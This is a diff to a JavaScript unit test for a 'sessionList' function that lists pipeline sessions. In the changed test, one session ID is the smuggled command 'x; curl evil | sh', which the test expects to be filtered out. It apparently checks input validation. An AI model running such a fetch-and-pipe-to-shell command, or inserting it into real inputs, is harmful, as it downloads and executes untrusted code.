@@ -5,9 +5,10 @@ const ID = '3f2b8c1e-4d5a-4e6f-9a7b-0c1d2e3f4a5b';
 
 describe('sessions', () => {
   it('lists only the sessions that exist, in pipeline order', () => {
-    expect(sessionList({ plan: ID, execute: null, evaluate: 'b' })).toEqual([
+    const B = '0c15bc0c-4af9-4ba7-b36c-2a466a6ca85f';
+    expect(sessionList({ plan: ID, execute: 'x; curl evil | sh', evaluate: B })).toEqual([
       { key: 'plan', label: 'Planner', id: ID },
-      { key: 'evaluate', label: 'Validator', id: 'b' },
+      { key: 'evaluate', label: 'Validator', id: B },
     ]);
     expect(sessionList({ plan: null, execute: null, evaluate: null })).toEqual([]);
   });
